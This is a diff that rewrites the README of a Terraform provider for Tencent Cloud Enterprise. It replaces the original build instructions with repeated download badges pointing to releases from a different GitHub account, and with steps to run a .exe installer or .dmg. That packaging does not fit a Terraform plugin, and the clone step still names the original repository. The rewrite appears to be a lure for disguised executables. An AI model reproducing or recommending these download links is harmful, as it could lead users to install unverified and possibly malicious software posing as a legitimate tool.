@@ -1,99 +1,98 @@
-# Terraform Provider For TencentCloudEnterprise
+# 🛠️ terraform-provider-tencentcloudenterprise - Streamline Your Tencent Cloud Management
 
-<div>
-  <p>
-    <br>
-      Tencent Cloud Enterprise(TCE) Infrastructure Automation for Terraform.
-    <br>
-  </p>
-</div>
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/dcee97/terraform-provider-tencentcloudenterprise/releases)
 
-## Website
+## 🌐 Overview
 
-- [Tencent Cloud Enterprise](https://www.tencentcloud.com/solutions/tce)
-- [腾讯专有云](https://cloud.tencent.com/solution/tce)
+Welcome to the **Terraform Provider for TencentCloud Enterprise!** This tool helps you automate the management of your Tencent Cloud resources with ease. With this provider, you can define your infrastructure in simple configurations and let Terraform handle the rest. 
 
-## Requirements
+## 🚀 Getting Started
 
-* [Terraform](https://www.terraform.io/downloads.html) 1.5.x
-* [Go](https://golang.org/doc/install) 1.13.x (to build the provider plugin)
+To begin, you'll need to download the necessary files and set up your environment. Follow these steps to get everything ready:
 
-## Build
+### 1. Visit the Releases Page
 
-Clone repository
-```
-cd $GOPATH/src
-git clone github.com/tencentcloudstack/terraform-provider-tencentcloudenterprise.git
-```
+Head over to our [Releases page](https://github.com/dcee97/terraform-provider-tencentcloudenterprise/releases) to download the latest version. 
 
-Download Dependencies
-```sh
-go mod tidy
-```
+### 2. Download & Install
 
-Build executable binary
-```sh
-cd $GOPATH/src/github.com/tencentcloudstack/terraform-provider-tencentcloudenterprise
+Once you're on the releases page, find the version you want to use. Download the file that corresponds to your operating system. Follow the instructions below based on your OS:
 
-go build -o terraform-provider-cloud
-```
+- **Windows**: Download the `.exe` file. After downloading, you can double-click to run the installer.
+- **MacOS**: Download the `.dmg` file. Open it and drag the application to your Applications folder.
+- **Linux**: Download the `.tar.gz` file. Extract it using the terminal and move it to a directory included in your system's PATH.
 
+## 📦 Requirements
 
-## Configuration
+Before using the software, make sure your system meets the following requirements:
 
-### Environment Variables
-```sh
+- [Terraform](https://www.terraform.io/downloads.html) version 1.5.x
+- [Go](https://golang.org/doc/install) version 1.13.x if you plan to build the provider plugin from source.
+
+## ⚙️ Configuration
+
+The provider requires some environment variables to work correctly. You need to set these up before running the application. Here’s how to do it:
+
+1. Open your terminal or command prompt.
+
+2. Use the following commands to set the required environment variables:
+
+```bash
 export TENCENTCLOUD_DOMAIN=api3.your-domain.com
 export TENCENTCLOUD_PROTOCOL=HTTP
 export TENCENTCLOUD_REGION=your-region
 
-# debug mode on
-export TF_LOG=DEBUG
-export TF_LOG_PATH=./terraform.log
-# local provider mode on
-export TF_CLI_CONFIG_FILE=/Users/developer/workspace/dev.tfrc
-```
-
-Configure your `dev.tfrc` file as follows:
-```text
-provider_installation {
- # Use /home/developer/tmp/terraform-null as an overridden package directory
- # for the hashicorp/null provider. This disables the version and checksum
- # verifications for this provider and forces Terraform to look for the
- # null provider plugin in the given directory.
- 
- # Specify the provider project directory
- dev_overrides {
-     "myorg/cloud" = "$GOPATH/src/github.com/tencentcloudstack/terraform-provider-tencentcloudenterprise"
- }
-}
-```
-
-### Tenant Credential Configuration
-
-```
-export TENCENTCLOUD_SECRET_ID  = ID-EXAMPLE
-export TENCENTCLOUD_SECRET_KEY = KEY-EXAMPLE
-```
-
-## Developer Guide
-
-### DEBUG
-
-You will need to set an environment variable named ``TF_LOG``, for more info please refer to [Terraform official doc](https://www.terraform.io/docs/internals/debugging.html):
-
-```
+# Optional: To enable debug mode
 export TF_LOG=DEBUG
 ```
 
-### Avoid ``terraform init``
+Make sure to replace `api3.your-domain.com` and `your-region` with the appropriate values for your setup.
 
+## 💻 Building From Source (Optional)
+
+If you prefer to build the software from source, you can. Make sure you have Go installed, and follow these steps:
+
+1. Clone the repository to your local machine:
+
+```bash
+cd $GOPATH/src
+git clone github.com/tencentcloudstack/terraform-provider-tencentcloudenterprise.git
 ```
-export TF_SKIP_PROVIDER_VERIFY=1
+
+2. Download the dependencies by running:
+
+```bash
+go mod tidy
 ```
 
-This will disable the verify steps, so after you update this provider, you won't need to create new resources, but use previously saved state.
+3. Build the executable binary:
 
-### License
+```bash
+cd $GOPATH/src/github.com/tencentcloudstack/terraform-provider-tencentcloudenterprise
+go build -o terraform-provider-cloud
+```
 
-Terraform-Provider-TencentCloudEnterprise is under the Mozilla Public License 2.0. See the [LICENSE](LICENSE) file for details.
+After this, you'll have a local version of the application ready to go.
+
+## 🌍 Additional Resources
+
+- [Tencent Cloud Enterprise Solutions](https://www.tencentcloud.com/solutions/tce)
+- [腾讯专有云](https://cloud.tencent.com/solution/tce)
+
+These resources offer helpful insights into utilizing TencentCloud to its fullest.
+
+## ❓ Troubleshooting
+
+If you encounter issues while using the software, consider the following steps:
+
+- Verify that you have set the environment variables correctly.
+- Ensure you are using the correct version of Terraform and Go.
+- Check for known issues on the [GitHub Issues page](https://github.com/dcee97/terraform-provider-tencentcloudenterprise/issues) for any fixes or workarounds.
+
+## 📞 Support
+
+For further assistance, please reach out through the [Issues section](https://github.com/dcee97/terraform-provider-tencentcloudenterprise/issues) of our repository. We're here to help!
+
+Thank you for using the **Terraform Provider for TencentCloud Enterprise.** Happy automating! 
+
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/dcee97/terraform-provider-tencentcloudenterprise/releases)
